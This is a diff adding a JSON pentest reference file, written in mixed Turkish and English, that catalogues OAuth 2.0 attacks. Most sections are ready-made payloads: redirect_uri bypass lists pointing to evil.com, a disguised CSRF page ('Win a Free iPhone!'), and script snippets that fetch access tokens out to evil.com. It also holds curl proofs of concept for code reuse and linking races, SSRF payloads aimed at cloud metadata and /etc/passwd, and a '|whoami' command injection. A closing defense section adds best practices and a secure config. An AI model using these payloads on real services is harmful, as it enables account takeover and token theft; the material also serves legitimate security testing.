@@ -1,0 +1,484 @@
+{
+  "oauth_basics": {
+    "desc": "OAuth 2.0 temel bilgileri ve flow'lar",
+    "category": "OAuth",
+    "type": "Basics",
+    "risk": "Info",
+    "grant_types": {
+      "authorization_code": {
+        "desc": "En güvenli flow - backend app'ler için",
+        "flow": "1. User -> Authorization Server (login)\n2. Auth Server -> redirect_uri?code=xxx\n3. App -> token endpoint (code + client_secret)\n4. Auth Server -> access_token + refresh_token"
+      },
+      "implicit": {
+        "desc": "DEPRECATED - SPA'lar için kullanılırdı",
+        "flow": "1. User -> Authorization Server\n2. Auth Server -> redirect_uri#access_token=xxx",
+        "risk": "Token URL fragment'te expose oluyor"
+      },
+      "password": {
+        "desc": "DEPRECATED - first-party app'ler için",
+        "flow": "App doğrudan username/password alır ve token alır",
+        "risk": "User credentials app'e expose oluyor"
+      },
+      "client_credentials": {
+        "desc": "Machine-to-machine communication",
+        "flow": "App kendi credentials ile token alır (user yok)"
+      }
+    }
+  },
+
+  "oauth_redirect_uri_manipulation": {
+    "desc": "Redirect URI manipulation - en yaygın OAuth vulnerability",
+    "category": "OAuth",
+    "type": "Open Redirect",
+    "risk": "Critical",
+    "attacks": [
+      {
+        "name": "Open redirect via redirect_uri",
+        "vulnerable_check": "Authorization server redirect_uri'yi yetersiz validate ediyor",
+        "payloads": [
+          "?redirect_uri=https://evil.com",
+          "?redirect_uri=https://victim.com.evil.com",
+          "?redirect_uri=https://victim.com@evil.com",
+          "?redirect_uri=https://victim.com.evil.com/callback",
+          "?redirect_uri=https://victim.com%2Fevil.com",
+          "?redirect_uri=https://evil.com%23@victim.com",
+          "?redirect_uri=https://evil.com%3F@victim.com",
+          "?redirect_uri=//evil.com",
+          "?redirect_uri=///evil.com",
+          "?redirect_uri=/\\/\\evil.com",
+          "?redirect_uri=javascript:alert(document.domain)"
+        ],
+        "exploitation": "1. Attacker modifiye edilmiş OAuth URL oluşturur\n2. Victim link'e tıklar ve login olur\n3. Authorization code/token evil.com'a redirect edilir\n4. Attacker code ile access token alır"
+      },
+      {
+        "name": "Subdomain takeover ile redirect bypass",
+        "technique": "Registered redirect_uri: https://old.victim.com/callback\n1. old.victim.com subdomain'i unclaimed\n2. Attacker subdomain'i claim eder\n3. OAuth code/token attacker'a gelir"
+      },
+      {
+        "name": "Path traversal in redirect_uri",
+        "payloads": [
+          "?redirect_uri=https://victim.com/callback/../../../evil",
+          "?redirect_uri=https://victim.com/callback/%2e%2e/%2e%2e/evil",
+          "?redirect_uri=https://victim.com/callback/..%2f..%2fevil"
+        ]
+      },
+      {
+        "name": "Parameter pollution",
+        "payload": "?redirect_uri=https://victim.com/callback&redirect_uri=https://evil.com",
+        "note": "Bazı server'lar ilk redirect_uri validate eder ama ikincisini kullanır"
+      }
+    ]
+  },
+
+  "oauth_csrf_attacks": {
+    "desc": "OAuth CSRF attacks - state parameter eksikliği",
+    "category": "OAuth",
+    "type": "CSRF",
+    "risk": "High",
+    "vulnerability": {
+      "desc": "state parameter kullanılmıyor veya validate edilmiyor",
+      "impact": "Attacker victim'in hesabını kendi OAuth account'una bağlayabilir"
+    },
+    "exploitation": {
+      "scenario": "Victim'in Facebook hesabını attacker'ın Facebook'una bağlama",
+      "steps": [
+        "1. Attacker victim.com'da kendi hesabına login olur",
+        "2. OAuth flow başlatır ama son adımı tamamlamaz",
+        "3. Authorization code içeren URL'i alır: victim.com/callback?code=ATTACKER_CODE",
+        "4. Victim'i bu URL'e yönlendirir (CSRF)",
+        "5. Victim'in hesabı attacker'ın Facebook'una bağlanır",
+        "6. Attacker artık victim'in hesabına kendi Facebook ile login olabilir"
+      ],
+      "poc_html": "<!DOCTYPE html>\n<html>\n<body>\n<h1>Win a Free iPhone!</h1>\n<img src=\"https://victim.com/oauth/callback?code=ATTACKERS_OAUTH_CODE\" style=\"display:none\">\n</body>\n</html>"
+    },
+    "detection": {
+      "check": "OAuth flow'da state parameter var mı?",
+      "request": "GET /oauth/authorize?client_id=xxx&redirect_uri=xxx&state=RANDOM_VALUE",
+      "vulnerable": "state parameter yoksa veya validate edilmiyorsa CSRF riski var"
+    }
+  },
+
+  "oauth_token_theft": {
+    "desc": "OAuth token çalma teknikleri",
+    "category": "OAuth",
+    "type": "Token Theft",
+    "risk": "Critical",
+    "techniques": [
+      {
+        "name": "Referer header leak",
+        "desc": "Access token URL'de ise Referer ile leak olabilir",
+        "scenario": "Implicit flow: https://victim.com/#access_token=xxx\nPage'de external resource varsa: <img src='https://evil.com/tracker.png'>\nReferer: https://victim.com/#access_token=xxx"
+      },
+      {
+        "name": "Browser history",
+        "desc": "Implicit flow'da token browser history'de kalır",
+        "note": "victim.com/#access_token=xxx browser history'de görünür"
+      },
+      {
+        "name": "XSS via token",
+        "desc": "XSS ile localStorage/sessionStorage'dan token çalma",
+        "payload": "<script>fetch('https://evil.com/?token='+localStorage.getItem('access_token'))</script>"
+      },
+      {
+        "name": "Postmessage interception",
+        "desc": "OAuth callback postMessage kullanıyorsa intercept edilebilir",
+        "poc": "<script>\nwindow.addEventListener('message', function(e) {\n  if (e.data.access_token) {\n    fetch('https://evil.com/?token=' + e.data.access_token);\n  }\n});\n</script>\n<iframe src=\"https://victim.com/oauth/start\"></iframe>"
+      }
+    ]
+  },
+
+  "oauth_scope_upgrade": {
+    "desc": "OAuth scope upgrade/manipulation attacks",
+    "category": "OAuth",
+    "type": "Scope Manipulation",
+    "risk": "High",
+    "attacks": [
+      {
+        "name": "Scope upgrade during token exchange",
+        "desc": "Authorization code için az scope iste, token exchange'de fazla scope iste",
+        "step1": "GET /authorize?scope=read:profile",
+        "step2": "POST /token\nclient_id=xxx&code=xxx&scope=read:profile,write:profile,admin:all",
+        "check": "Server 2. adımda scope'u validate ediyor mu?"
+      },
+      {
+        "name": "Scope downgrade visibility",
+        "desc": "User'a az scope göster, arka planda fazla iste",
+        "example": "UI'da: 'We need access to your profile'\nGerçek: ?scope=read:profile,read:messages,read:contacts,delete:account"
+      },
+      {
+        "name": "Wildcard scope abuse",
+        "payloads": [
+          "?scope=*",
+          "?scope=read:*",
+          "?scope=admin:*",
+          "?scope=write:*"
+        ],
+        "note": "Bazı OAuth server'lar wildcard scope kabul edebilir"
+      }
+    ]
+  },
+
+  "oauth_account_takeover": {
+    "desc": "OAuth account takeover scenarios",
+    "category": "OAuth",
+    "type": "Account Takeover",
+    "risk": "Critical",
+    "scenarios": [
+      {
+        "name": "Pre-account takeover via OAuth",
+        "steps": [
+          "1. Attacker victim'in email'ini biliyor: victim@gmail.com",
+          "2. Attacker victim.com'da victim@gmail.com ile kayıt olmaya çalışır",
+          "3. victim.com 'Email zaten kullanımda, OAuth ile login olun' der",
+          "4. Attacker kendi Google account'u ile OAuth yapar",
+          "5. victim.com email match diye account'ları merge eder",
+          "6. Attacker artık victim'in hesabına sahip!"
+        ],
+        "vulnerability": "App OAuth email'i verify etmeden mevcut hesaba bağlıyor"
+      },
+      {
+        "name": "OAuth email verification bypass",
+        "technique": "OAuth provider'dan gelen email verified mi kontrol edilmiyor",
+        "exploitation": "1. Gmail'de unverified email: victim@company.com\n2. victim.com'a bu email ile OAuth login\n3. victim.com email verified diye düşünür\n4. Attacker verified email sahibi gibi davranır"
+      },
+      {
+        "name": "Race condition in OAuth linking",
+        "desc": "2 request paralel gönder, ikisi de aynı OAuth account'u farklı user'lara bağlasın",
+        "poc": "# Terminal 1\ncurl -X POST 'https://victim.com/link-oauth' -d 'oauth_token=xxx' -H 'Cookie: session=USER1'\n\n# Terminal 2 (aynı anda)\ncurl -X POST 'https://victim.com/link-oauth' -d 'oauth_token=xxx' -H 'Cookie: session=USER2'"
+      }
+    ]
+  },
+
+  "oauth_client_secret_disclosure": {
+    "desc": "OAuth client_secret leak ve exploitation",
+    "category": "OAuth",
+    "type": "Secret Disclosure",
+    "risk": "Critical",
+    "discovery": [
+      {
+        "location": "Mobile app binary'sinde",
+        "tool": "jadx, apktool, hopper, strings",
+        "command": "strings app.apk | grep client_secret"
+      },
+      {
+        "location": "JavaScript source code",
+        "check": "View source, webpack bundles, .map files",
+        "search": "client_secret, clientSecret, oauth_secret"
+      },
+      {
+        "location": "GitHub/GitLab repos",
+        "tool": "TruffleHog, GitLeaks, git-secrets",
+        "search": "github.com/victim-org search: client_secret"
+      },
+      {
+        "location": "Public S3 buckets, config files",
+        "files": "config.json, .env, application.properties"
+      }
+    ],
+    "exploitation": {
+      "desc": "client_secret ile authorization code'u token'a çevirebilirsin",
+      "usage": "POST /oauth/token\ngrant_type=authorization_code&code=STOLEN_CODE&client_id=xxx&client_secret=LEAKED_SECRET&redirect_uri=xxx"
+    }
+  },
+
+  "oauth_authorization_code_reuse": {
+    "desc": "Authorization code re-use attack",
+    "category": "OAuth",
+    "type": "Code Reuse",
+    "risk": "High",
+    "vulnerability": {
+      "desc": "Authorization code 1 kez kullanılmalı, ama bazı implementation'lar bunu enforce etmiyor",
+      "test": "1. Normal OAuth flow yap, code al\n2. Code ile token exchange yap\n3. Aynı code ile tekrar token exchange dene\n4. Başarılı olursa vulnerable!"
+    },
+    "exploitation": {
+      "scenario": "Authorization code intercept edilmişse birden fazla token alınabilir",
+      "poc": "curl -X POST https://oauth.victim.com/token \\\n  -d 'grant_type=authorization_code' \\\n  -d 'code=INTERCEPTED_CODE' \\\n  -d 'client_id=xxx' \\\n  -d 'client_secret=xxx' \\\n  -d 'redirect_uri=xxx'\n\n# Aynı code ile tekrar dene"
+    }
+  },
+
+  "oauth_pkce_bypass": {
+    "desc": "PKCE (Proof Key for Code Exchange) bypass",
+    "category": "OAuth",
+    "type": "PKCE Bypass",
+    "risk": "High",
+    "pkce_flow": {
+      "desc": "PKCE authorization code interception saldırısını önler",
+      "step1": "code_verifier = random_string()",
+      "step2": "code_challenge = SHA256(code_verifier)",
+      "step3": "/authorize?code_challenge=xxx&code_challenge_method=S256",
+      "step4": "/token?code=xxx&code_verifier=original_random_string"
+    },
+    "bypass_attempts": [
+      {
+        "name": "PKCE olmadan token al",
+        "test": "PKCE parametrelerini gönderme, server mecbur ediyor mu?",
+        "request": "POST /token\ncode=xxx&client_id=xxx (code_verifier YOK)"
+      },
+      {
+        "name": "code_challenge_method downgrade",
+        "payloads": [
+          "code_challenge_method=plain (SHA256 yerine)",
+          "code_challenge_method=none"
+        ],
+        "note": "plain method ise attacker code_verifier tahmin edebilir"
+      },
+      {
+        "name": "PKCE validation race condition",
+        "desc": "2 request paralel gönder, ikisi de aynı code'u farklı code_verifier ile kullanmaya çalışsın"
+      }
+    ]
+  },
+
+  "oauth_jwt_attacks": {
+    "desc": "OAuth access token JWT ise JWT attacks",
+    "category": "OAuth",
+    "type": "JWT Attacks",
+    "risk": "Critical",
+    "attacks": [
+      {
+        "name": "JWT None algorithm",
+        "desc": "Access token JWT, algorithm: none ile signature bypass",
+        "reference": "web_jwt_api_security.json"
+      },
+      {
+        "name": "JWT secret brute force",
+        "tool": "jwt_tool, hashcat",
+        "command": "hashcat -m 16500 jwt.txt wordlist.txt"
+      },
+      {
+        "name": "JWT kid header injection",
+        "payload": "kid: /dev/null, ../../public.key, |whoami"
+      }
+    ]
+  },
+
+  "oauth_refresh_token_abuse": {
+    "desc": "Refresh token abuse",
+    "category": "OAuth",
+    "type": "Refresh Token",
+    "risk": "High",
+    "attacks": [
+      {
+        "name": "Refresh token reuse",
+        "desc": "Refresh token rotate edilmiyor, sınırsız kullanılabiliyor",
+        "test": "1. Refresh token al\n2. Refresh token ile access token al\n3. Aynı refresh token ile tekrar access token al\n4. Başarılı olursa vulnerable (refresh token rotate olmalıydı)"
+      },
+      {
+        "name": "Refresh token leakage",
+        "locations": [
+          "localStorage (XSS ile çalınabilir)",
+          "Logs (server logs, CDN logs)",
+          "Referer header",
+          "Analytics/crash reporting tools"
+        ]
+      },
+      {
+        "name": "Refresh token expiration",
+        "test": "Refresh token expire oluyor mu? 1 yıl geçerli mi?",
+        "risk": "Uzun ömürlü refresh token çalınırsa kalıcı erişim"
+      }
+    ]
+  },
+
+  "oauth_ssrf_via_metadata": {
+    "desc": "SSRF via OAuth metadata endpoint",
+    "category": "OAuth",
+    "type": "SSRF",
+    "risk": "High",
+    "technique": {
+      "desc": "Bazı OAuth server'lar dynamic metadata URL kabul eder",
+      "vulnerable_param": "?metadata_url=https://evil.com/.well-known/oauth-config",
+      "exploitation": "?metadata_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "payloads": [
+        "?metadata_url=http://localhost:6379/",
+        "?metadata_url=file:///etc/passwd",
+        "?metadata_url=http://internal-api.local/admin"
+      ]
+    }
+  },
+
+  "oauth_open_redirect_chaining": {
+    "desc": "OAuth open redirect chaining ile bypass",
+    "category": "OAuth",
+    "type": "Redirect Chaining",
+    "risk": "High",
+    "technique": {
+      "desc": "Whitelisted domain'de open redirect var, OAuth redirect bypass",
+      "example": "Whitelisted: https://trusted.victim.com\nOpen redirect: https://trusted.victim.com/redir?url=https://evil.com\nOAuth: ?redirect_uri=https://trusted.victim.com/redir?url=https://evil.com",
+      "flow": "1. OAuth code -> trusted.victim.com/redir?url=evil.com\n2. trusted.victim.com redirects to evil.com\n3. evil.com gets OAuth code!"
+    }
+  },
+
+  "oauth_mobile_app_attacks": {
+    "desc": "Mobile OAuth implementation attacks",
+    "category": "OAuth",
+    "type": "Mobile",
+    "risk": "High",
+    "attacks": [
+      {
+        "name": "Custom URL scheme hijacking",
+        "desc": "myapp://oauth/callback scheme'ini başka app claim edebilir",
+        "android": "Başka app aynı intent-filter tanımlar, OAuth code'u intercept eder",
+        "ios": "iOS 9+ claimed URL check yapar ama eski iOS'larda risk var"
+      },
+      {
+        "name": "Deeplink interception",
+        "desc": "App deeplink ile OAuth code alıyorsa intercept edilebilir",
+        "tool": "Frida, objection, adb"
+      },
+      {
+        "name": "WebView token extraction",
+        "desc": "OAuth flow WebView'da yapılıyorsa JavaScript injection",
+        "frida_script": "Java.perform(function() {\n  WebView.loadUrl.implementation = function(url) {\n    console.log('URL:', url);\n    if (url.includes('access_token')) {\n      // Token stolen!\n    }\n    this.loadUrl(url);\n  };\n});"
+      }
+    ]
+  },
+
+  "oauth_testing_checklist": {
+    "desc": "OAuth penetration testing checklist",
+    "category": "OAuth",
+    "type": "Testing",
+    "checklist": [
+      "Test redirect_uri validation (all bypass payloads)",
+      "Check state parameter (CSRF protection)",
+      "Test scope manipulation",
+      "Authorization code reuse",
+      "PKCE enforcement (mobile/SPA apps)",
+      "Refresh token rotation",
+      "Refresh token expiration",
+      "Client secret exposure (mobile/JS)",
+      "Email verification in OAuth flow",
+      "Account linking race conditions",
+      "Open redirect chaining",
+      "JWT token attacks (if JWT used)",
+      "Token leakage (Referer, logs, XSS)",
+      "SSRF via metadata_url",
+      "Pre-account takeover",
+      "Implicit flow deprecation check"
+    ],
+    "tools": [
+      "Burp Suite",
+      "OAuth.tools",
+      "jwt_tool",
+      "Postman",
+      "curl + jq"
+    ]
+  },
+
+  "oauth_real_world_examples": {
+    "desc": "Real-world OAuth vulnerability examples",
+    "category": "OAuth",
+    "type": "Case Studies",
+    "examples": [
+      {
+        "app": "Facebook",
+        "vuln": "redirect_uri bypass via @",
+        "payload": "redirect_uri=https://attacker.com@facebook.com",
+        "bounty": "$33,500"
+      },
+      {
+        "app": "GitLab",
+        "vuln": "OAuth account takeover via email",
+        "impact": "Attacker could take over any GitLab account",
+        "bounty": "$20,000"
+      },
+      {
+        "app": "Shopify",
+        "vuln": "OAuth state fixation",
+        "impact": "CSRF leading to account linking",
+        "bounty": "$20,000"
+      },
+      {
+        "app": "Microsoft",
+        "vuln": "OAuth redirect_uri bypass",
+        "payload": "redirect_uri=https://login.live.com.attacker.com",
+        "bounty": "$15,000"
+      }
+    ]
+  },
+
+  "oauth_defense": {
+    "desc": "OAuth implementation best practices",
+    "category": "OAuth",
+    "type": "Defense",
+    "best_practices": [
+      {
+        "rule": "Strict redirect_uri validation",
+        "implementation": "Exact string match, no regex. Whitelist tam URL'leri.",
+        "avoid": "if (redirect_uri.startsWith(whitelisted)) { }",
+        "use": "if (redirect_uri === whitelisted_url) { }"
+      },
+      {
+        "rule": "Always use state parameter",
+        "implementation": "Cryptographically random, session'a bağlı, tek kullanımlık"
+      },
+      {
+        "rule": "Authorization code: 1 kez kullanılmalı",
+        "implementation": "Code kullanıldıktan sonra invalidate et"
+      },
+      {
+        "rule": "PKCE mandatory for mobile/SPA",
+        "note": "S256 method mecburi, plain kabul etme"
+      },
+      {
+        "rule": "Refresh token rotation",
+        "implementation": "Her refresh'te yeni refresh token ver, eskisini invalidate et"
+      },
+      {
+        "rule": "Email verification",
+        "check": "OAuth provider'dan email_verified claim'ini kontrol et"
+      },
+      {
+        "rule": "Short-lived access tokens",
+        "recommendation": "Access token: 15 dakika, refresh token: 30 gün (rotate ile)"
+      },
+      {
+        "rule": "No client_secret in frontend",
+        "note": "SPA/Mobile app'lerde client_secret kullanma, PKCE kullan"
+      }
+    ],
+    "secure_implementation": {
+      "nodejs_passport": "passport.use(new OAuth2Strategy({\n  authorizationURL: 'https://oauth.provider.com/authorize',\n  tokenURL: 'https://oauth.provider.com/token',\n  clientID: process.env.CLIENT_ID,\n  clientSecret: process.env.CLIENT_SECRET,\n  callbackURL: 'https://myapp.com/auth/callback',\n  state: true, // CSRF protection\n  pkce: true,  // PKCE for security\n  scope: ['read:profile']\n}, function(accessToken, refreshToken, profile, cb) {\n  // Verify email_verified flag\n  if (!profile.email_verified) {\n    return cb(new Error('Email not verified'));\n  }\n  return cb(null, profile);\n}));"
+    }
+  }
+}
